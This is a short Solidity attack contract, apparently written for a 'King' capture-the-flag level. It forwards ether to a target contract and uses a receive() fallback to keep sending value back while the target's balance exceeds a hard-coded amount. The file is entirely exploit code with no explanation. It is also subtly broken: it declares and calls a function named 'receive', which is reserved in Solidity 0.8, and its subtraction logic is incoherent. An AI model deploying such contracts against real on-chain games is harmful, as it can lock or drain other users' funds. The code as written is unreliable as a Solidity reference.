pragma solidity ^0.8.0;

interface IKing {
    function receive() external payable;
}


contract KingAttack {
    IKing public vulnerability;

    constructor(address _instance) {
        vulnerability = IKing(_instance);
    }

    function attack() public payable {
        vulnerability.receive{value: msg.value}();
    }

    receive() external payable {
        if (address(vulnerability).balance > 7990000000000000) {
            vulnerability.receive{value: msg.value - 7990000000000000}();
        }
    }
}